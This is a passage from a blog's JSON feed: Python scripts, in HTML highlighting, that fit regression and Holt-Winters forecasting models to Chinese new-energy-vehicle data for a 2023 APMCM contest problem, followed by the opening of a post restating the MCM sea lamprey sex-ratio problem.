<td>117.3</td>\n<td>22.5</td>\n<td>7.3</td>\n</tr>\n</tbody>\n</table>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.linear_model <span class=\"keyword\">import</span> LinearRegression</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> r2_score, mean_squared_error</span><br><span class=\"line\"><span class=\"comment\"># 读取 Excel 文件</span></span><br><span class=\"line\">excel_path = <span class=\"string\">r&#x27;D:\\desktop\\2023亚太赛 c 数据\\第二问\\data\\第二问数据整合.xlsx&#x27;</span></span><br><span class=\"line\">df = pd.read_excel(excel_path)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 选择自变量和因变量</span></span><br><span class=\"line\">X = df[[<span class=\"string\">&#x27;年份&#x27;</span>, <span class=\"string\">&#x27;新能源汽车保有量（万辆）&#x27;</span>,<span class=\"string\">&#x27;新能源汽车市场规模（亿元人民币）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车市场渗透率（%）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车环比增长率(%)&#x27;</span>, <span class=\"string\">&#x27;新能源汽车企业数量（家）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车专利申请数量（项）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车产业链规模（家）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车充电桩数量（万个）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车充电基础设施覆盖率（%）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车补贴金额（亿元人民币）&#x27;</span>, <span class=\"string\">&#x27;传统燃油车市场渗透率（%）&#x27;</span>, <span class=\"string\">&#x27;长三角地区碳排放总量(百万吨)&#x27;</span>, <span class=\"string\">&#x27;传统汽车产销量（万辆）&#x27;</span>, <span class=\"string\">&#x27;传统汽车环比增长率(%)&#x27;</span>, <span class=\"string\">&#x27;磷酸铁锂动力电池装机量/GWh&#x27;</span>, <span class=\"string\">&#x27;三元电池装机量/GWh&#x27;</span>, <span class=\"string\">&#x27;碳排放总量(百万吨)&#x27;</span>, <span class=\"string\">&#x27;新能源汽车加权平均价格(万元)&#x27;</span>]]</span><br><span class=\"line\">Y = df[<span class=\"string\">&#x27;新能源汽车产销量（万辆）&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\"># 创建线性回归模型</span></span><br><span class=\"line\">model = LinearRegression()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 拟合模型</span></span><br><span class=\"line\">model.fit(X, Y)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取回归系数</span></span><br><span class=\"line\">coefficients = pd.DataFrame(&#123;<span class=\"string\">&#x27;Variable&#x27;</span>: [<span class=\"string\">&#x27;intercept&#x27;</span>] + <span class=\"built_in\">list</span>(X.columns), <span class=\"string\">&#x27;Coefficient&#x27;</span>: [model.intercept_] + <span class=\"built_in\">list</span>(model.coef_)&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输出回归系数</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(coefficients)</span><br><span class=\"line\"><span class=\"comment\"># 预测值</span></span><br><span class=\"line\">predictions = model.predict(X)</span><br><span class=\"line\"><span class=\"comment\"># 计算R²和标准估计误差</span></span><br><span class=\"line\">r2 = r2_score(Y, predictions)</span><br><span class=\"line\">mse = mean_squared_error(Y, predictions)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输出R²和标准估计误差</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;R²:&#x27;</span>, r2)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;标准估计误差:&#x27;</span>, mse)</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> statsmodels.tsa.holtwinters <span class=\"keyword\">import</span> ExponentialSmoothing</span><br><span class=\"line\"><span class=\"keyword\">from</span> statsmodels.tsa.seasonal <span class=\"keyword\">import</span> seasonal_decompose</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\">plt.rcParams[<span class=\"string\">&#x27;font.sans-serif&#x27;</span>] = [<span class=\"string\">&#x27;SimHei&#x27;</span>]  <span class=\"comment\"># 设置中文字体为黑体</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1. 数据导入和准备</span></span><br><span class=\"line\">df = pd.read_excel(<span class=\"string\">&quot;第二问数据整合.xlsx&quot;</span>, index_col=<span class=\"string\">&quot;年份&quot;</span>)</span><br><span class=\"line\">df.index = pd.to_datetime(df.index, <span class=\"built_in\">format</span>=<span class=\"string\">&#x27;%Y&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. 可视化数据</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">10</span>, <span class=\"number\">6</span>))</span><br><span class=\"line\">plt.plot(df[<span class=\"string\">&#x27;新能源汽车保有量（万辆）&#x27;</span>], marker=<span class=\"string\">&#x27;o&#x27;</span>, label=<span class=\"string\">&#x27;新能源汽车保有量&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;新能源汽车保有量 Over Time&#x27;</span>)</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Year&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;新能源汽车保有量（万辆）&#x27;</span>)</span><br><span class=\"line\">plt.legend()</span><br><span class=\"line\">plt.savefig(<span class=\"string\">&quot;可视化数据.png&quot;</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3. 趋势分析</span></span><br><span class=\"line\">result = seasonal_decompose(df[<span class=\"string\">&#x27;新能源汽车保有量（万辆）&#x27;</span>], model=<span class=\"string\">&#x27;multiplicative&#x27;</span>, period=<span class=\"number\">1</span>)  <span class=\"comment\"># 选择合适的周期</span></span><br><span class=\"line\">result.plot()</span><br><span class=\"line\">plt.savefig(<span class=\"string\">&quot;趋势分析.png&quot;</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 4. 时间序列预测模型 - Holt-Winters Exponential Smoothing</span></span><br><span class=\"line\"><span class=\"comment\"># 将数据拆分为训练集和测试集</span></span><br><span class=\"line\">train_size = <span class=\"built_in\">int</span>(<span class=\"built_in\">len</span>(df) * <span class=\"number\">0.8</span>)</span><br><span class=\"line\">train, test = df[<span class=\"string\">&#x27;新能源汽车保有量（万辆）&#x27;</span>][:train_size], df[<span class=\"string\">&#x27;新能源汽车保有量（万辆）&#x27;</span>][train_size:]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 创建并拟合模型</span></span><br><span class=\"line\"><span class=\"comment\"># 使用Holt-Winters指数平滑模型</span></span><br><span class=\"line\">model = ExponentialSmoothing(train, seasonal=<span class=\"string\">&#x27;add&#x27;</span>, seasonal_periods=<span class=\"number\">2</span>)</span><br><span class=\"line\">result = model.fit()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 预测</span></span><br><span class=\"line\">forecast = result.forecast(steps=<span class=\"built_in\">len</span>(test))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 保存预测结果为 Excel 文件</span></span><br><span class=\"line\">result_df = pd.DataFrame(&#123;<span class=\"string\">&#x27;实际值&#x27;</span>: test, <span class=\"string\">&#x27;预测值&#x27;</span>: forecast&#125;)</span><br><span class=\"line\">result_df.to_excel(<span class=\"string\">&#x27;预测结果.xlsx&#x27;</span>, index=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 可视化预测结果</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">12</span>, <span class=\"number\">6</span>))</span><br><span class=\"line\">plt.plot(train.index, train, label=<span class=\"string\">&#x27;Train&#x27;</span>)</span><br><span class=\"line\">plt.plot(test.index, test, label=<span class=\"string\">&#x27;Test&#x27;</span>)</span><br><span class=\"line\">plt.plot(test.index, forecast, label=<span class=\"string\">&#x27;Predicted&#x27;</span>, linestyle=<span class=\"string\">&#x27;dashed&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;新能源汽车保有量预测&#x27;</span>)</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Year&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;新能源汽车保有量（万辆）&#x27;</span>)</span><br><span class=\"line\">plt.legend()</span><br><span class=\"line\">plt.savefig(<span class=\"string\">&quot;新能源汽车保有量预测.png&quot;</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">import</span> statsmodels.api <span class=\"keyword\">as</span> sm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取 Excel 文件</span></span><br><span class=\"line\">excel_path = <span class=\"string\">r&#x27;D:\\desktop\\2023亚太赛 c 数据\\第二问\\data\\第二问数据整合.xlsx&#x27;</span></span><br><span class=\"line\">df = pd.read_excel(excel_path)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 选择自变量和因变量</span></span><br><span class=\"line\">X = df[[<span class=\"string\">&#x27;年份&#x27;</span>, <span class=\"string\">&#x27;新能源汽车保有量（万辆）&#x27;</span>,<span class=\"string\">&#x27;新能源汽车市场规模（亿元人民币）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车市场渗透率（%）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车环比增长率(%)&#x27;</span>, <span class=\"string\">&#x27;新能源汽车企业数量（家）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车专利申请数量（项）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车产业链规模（家）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车充电桩数量（万个）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车充电基础设施覆盖率（%）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车补贴金额（亿元人民币）&#x27;</span>, <span class=\"string\">&#x27;传统燃油车市场渗透率（%）&#x27;</span>, <span class=\"string\">&#x27;长三角地区碳排放总量(百万吨)&#x27;</span>, <span class=\"string\">&#x27;传统汽车产销量（万辆）&#x27;</span>, <span class=\"string\">&#x27;传统汽车环比增长率(%)&#x27;</span>, <span class=\"string\">&#x27;磷酸铁锂动力电池装机量/GWh&#x27;</span>, <span class=\"string\">&#x27;三元电池装机量/GWh&#x27;</span>, <span class=\"string\">&#x27;碳排放总量(百万吨)&#x27;</span>, <span class=\"string\">&#x27;新能源汽车加权平均价格(万元)&#x27;</span>]]</span><br><span class=\"line\">Y = df[<span class=\"string\">&#x27;新能源汽车产销量（万辆）&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 添加截距项</span></span><br><span class=\"line\">X = sm.add_constant(X)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 拟合线性回归模型</span></span><br><span class=\"line\">model = sm.OLS(Y, X).fit()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 进行F检验</span></span><br><span class=\"line\">f_test = model.f_test(<span class=\"string\">&quot; &quot;</span>.join(X.columns[<span class=\"number\">1</span>:]))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(f_test)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> statsmodels.tsa.holtwinters <span class=\"keyword\">import</span> ExponentialSmoothing</span><br><span class=\"line\">plt.rcParams[<span class=\"string\">&#x27;font.sans-serif&#x27;</span>] = [<span class=\"string\">&#x27;SimHei&#x27;</span>]  <span class=\"comment\"># 设置中文字体为黑体</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1. 数据导入和准备</span></span><br><span class=\"line\">df = pd.read_excel(<span class=\"string\">&quot;data/第二问数据整合.xlsx&quot;</span>, index_col=<span class=\"string\">&quot;年份&quot;</span>)</span><br><span class=\"line\">df.index = pd.to_datetime(df.index, <span class=\"built_in\">format</span>=<span class=\"string\">&#x27;%Y&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. 需要预测的列名</span></span><br><span class=\"line\">columns_to_predict = [</span><br><span class=\"line\">    <span class=\"string\">&#x27;新能源汽车市场渗透率（%）&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;新能源汽车环比增长率(%)&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;新能源汽车企业数量（家）&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;新能源汽车专利申请数量（项）&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;新能源汽车产业链规模（家）&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;新能源汽车充电桩数量（万个）&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;新能源汽车充电基础设施覆盖率（%）&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;新能源汽车补贴金额（亿元人民币）&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;传统燃油车市场渗透率（%）&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;长三角地区碳排放总量(百万吨)&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;传统汽车产销量（万辆）&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;传统汽车环比增长率(%)&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;磷酸铁锂动力电池装机量/GWh&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;三元电池装机量/GWh&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;碳排放总量(百万吨)&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;新能源汽车加权平均价格(万元)&#x27;</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3. 循环预测并保存结果和图</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns_to_predict:</span><br><span class=\"line\">    <span class=\"comment\"># 创建并拟合模型</span></span><br><span class=\"line\">    model = ExponentialSmoothing(df[column], seasonal=<span class=\"string\">&#x27;add&#x27;</span>, seasonal_periods=<span class=\"number\">2</span>)</span><br><span class=\"line\">    result = model.fit()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 预测</span></span><br><span class=\"line\">    forecast = result.forecast(steps=<span class=\"number\">11</span>)  <span class=\"comment\"># 预测2023年到2033年的数据</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 输出预测结果</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;<span class=\"subst\">&#123;column&#125;</span> 预测结果:&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(forecast)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 可视化预测结果</span></span><br><span class=\"line\">    plt.figure(figsize=(<span class=\"number\">12</span>, <span class=\"number\">6</span>))</span><br><span class=\"line\">    plt.plot(df.index, df[column], label=<span class=\"string\">&#x27;历史数据&#x27;</span>)</span><br><span class=\"line\">    plt.plot(pd.date_range(start=<span class=\"string\">&#x27;2023-01-01&#x27;</span>, periods=<span class=\"number\">11</span>, freq=<span class=\"string\">&#x27;Y&#x27;</span>), forecast, label=<span class=\"string\">&#x27;预测&#x27;</span>, linestyle=<span class=\"string\">&#x27;dashed&#x27;</span>)</span><br><span class=\"line\">    plt.title(<span class=\"string\">f&#x27;<span class=\"subst\">&#123;column&#125;</span>预测&#x27;</span>)</span><br><span class=\"line\">    plt.xlabel(<span class=\"string\">&#x27;年份&#x27;</span>)</span><br><span class=\"line\">    plt.ylabel(column)</span><br><span class=\"line\">    plt.legend()</span><br><span class=\"line\">    plt.savefig(<span class=\"string\">f&quot;<span class=\"subst\">&#123;column&#125;</span>_预测.png&quot;</span>)</span><br><span class=\"line\">    plt.close()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">import</span> statsmodels.api <span class=\"keyword\">as</span> sm</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"comment\"># 读取 Excel 文件</span></span><br><span class=\"line\">excel_path = <span class=\"string\">r&#x27;D:\\desktop\\2023亚太赛 c 数据\\第二问\\data\\第二问数据整合.xlsx&#x27;</span></span><br><span class=\"line\">df = pd.read_excel(excel_path)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用回归方程的系数</span></span><br><span class=\"line\">coefficients = [-<span class=\"number\">175.361921</span>, <span class=\"number\">0.786334</span>, <span class=\"number\">4.674333</span>, <span class=\"number\">0.133171</span>, <span class=\"number\">1.340155</span>, <span class=\"number\">0.203066</span>, <span class=\"number\">5.114536</span>, -<span class=\"number\">1.460884</span>, <span class=\"number\">0.602279</span>,</span><br><span class=\"line\">                <span class=\"number\">2.367206</span>, -<span class=\"number\">7.039104</span>, <span class=\"number\">7.524213</span>, -<span class=\"number\">1.340155</span>, -<span class=\"number\">0.623688</span>, <span class=\"number\">0.488335</span>, -<span class=\"number\">6.786688</span>, -<span class=\"number\">2.279974</span>, <span class=\"number\">5.143792</span>,</span><br><span class=\"line\">                -<span class=\"number\">0.075757</span>, <span class=\"number\">0.393167</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 选择自变量</span></span><br><span class=\"line\">features = df[[<span class=\"string\">&#x27;年份&#x27;</span>, <span class=\"string\">&#x27;新能源汽车保有量（万辆）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车市场规模（亿元人民币）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车市场渗透率（%）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车环比增长率(%)&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;新能源汽车企业数量（家）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车专利申请数量（项）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车产业链规模（家）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车充电桩数量（万个）&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;新能源汽车充电基础设施覆盖率（%）&#x27;</span>, <span class=\"string\">&#x27;新能源汽车补贴金额（亿元人民币）&#x27;</span>, <span class=\"string\">&#x27;传统燃油车市场渗透率（%）&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;长三角地区碳排放总量(百万吨)&#x27;</span>, <span class=\"string\">&#x27;传统汽车产销量（万辆）&#x27;</span>, <span class=\"string\">&#x27;传统汽车环比增长率(%)&#x27;</span>, <span class=\"string\">&#x27;磷酸铁锂动力电池装机量/GWh&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;三元电池装机量/GWh&#x27;</span>, <span class=\"string\">&#x27;碳排放总量(百万吨)&#x27;</span>, <span class=\"string\">&#x27;新能源汽车加权平均价格(万元)&#x27;</span>]]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 添加截距项</span></span><br><span class=\"line\">features = sm.add_constant(features)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算预测值</span></span><br><span class=\"line\">predicted_sales = np.dot(features.values, coefficients)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将预测值添加到数据框</span></span><br><span class=\"line\">df[<span class=\"string\">&#x27;预测新能源汽车产销量（万辆）&#x27;</span>] = predicted_sales</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输出结果</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(df[[<span class=\"string\">&#x27;年份&#x27;</span>, <span class=\"string\">&#x27;新能源汽车产销量（万辆）&#x27;</span>, <span class=\"string\">&#x27;预测新能源汽车产销量（万辆）&#x27;</span>]])</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "Hexo",
                "Front Matter",
                "code",
                "recommendation"
            ]
        },
        {
            "id": "https://enjundu.github.io/bit/%E7%BE%8E%E8%B5%9B%E2%80%94%E2%80%94%E4%B8%83%E9%B3%83%E9%B3%97/",
            "url": "https://enjundu.github.io/bit/%E7%BE%8E%E8%B5%9B%E2%80%94%E2%80%94%E4%B8%83%E9%B3%83%E9%B3%97/",
            "title": "美赛——七鳃鳗",
            "date_published": "2024-07-04T01:41:31.000Z",
            "content_html": "<h1 id=\"mcm-paper\"><a class=\"anchor\" href=\"#mcm-paper\">#</a> MCM paper</h1>\n<h2 id=\"question\"><a class=\"anchor\" href=\"#question\">#</a> question</h2>\n<p>​\tWhile some animal species exist outside of the usual male or female sexes, most species are</p>\n<p>substantially either male or female. Although many species exhibit a 1:1 sex ratio at birth, other</p>\n<p>species deviate from an even sex ratio. This is called adaptive sex ratio variation. For example,</p>\n<p>the temperature of the nest incubating eggs of the American alligator influences the sex ratios at</p>\n<p>birth</p>\n<p>​\tThe role of <strong>lampreys</strong> is complex. In some lake habitats, they are seen as parasites with a</p>\n<p>significant impact on the ecosystem, whereas lampreys are also a food source in some regions of</p>\n<p>the world, such as Scandinavia, the Baltics, and for some Indigenous peoples of the Pacific</p>\n<p>Northwest in North America.</p>\n<p>​\tThe sex ratio of sea lampreys can vary based on external circumstances. Sea lampreys become</p>\n<p>male or female depending on how quickly they grow during the larval stage. These larval growth</p>\n<p>rates are influenced by the availability of food. In environments where food availability is low,</p>\n<p>growth rates will be lower, and the percentage of males can reach approximately 78% of the</p>\n<p>population. In environments where food is more readily available, the percentage of males has</p>\n<p>been observed to be approximately 56% of the population.</p>\n<p>​\tWe focus on the question of sex ratios and their dependence on local conditions, specifically for</p>\n<p>sea lampreys. Sea lampreys live in lake or sea habitats and migrate up rivers to spawn. The task</p>\n<p>is to examine the advantages and disadvantages of the ability for a species to alter its sex ratio</p>\n<p>depending on resource availability. Your team should develop and examine a model to provide</p>\n<p>insights into the resulting interactions in an ecosystem.</p>\n<p>Questions to examine include the following:</p>\n<ul>\n<li>\n<p>What is the impact on the larger ecological system when the population of lampreys can</p>\n<p>alter its sex ratio?</p>\n</li>\n<li>\n<p>What are the advantages and disadvantages to the population of lampreys?</p>\n</li>\n<li>\n<p>What is the impact on the stability of the ecosystem given the changes in the sex ratios of</p>\n<p>lampreys?</p>\n</li>\n<li>\n<p>Can an ecosystem with variable sex ratios in the lamprey population offer advantages to</p>\n<p>others in the ecosystem, such as parasites?</p>\n<h2 id=\"paper-begin\"><a class=\"anchor\" href=\"#paper-begin\">#</a> Paper begin</h2>\n<h3 id=\"summary\"><a class=\"anchor\" href=\"#summary\">#</a> 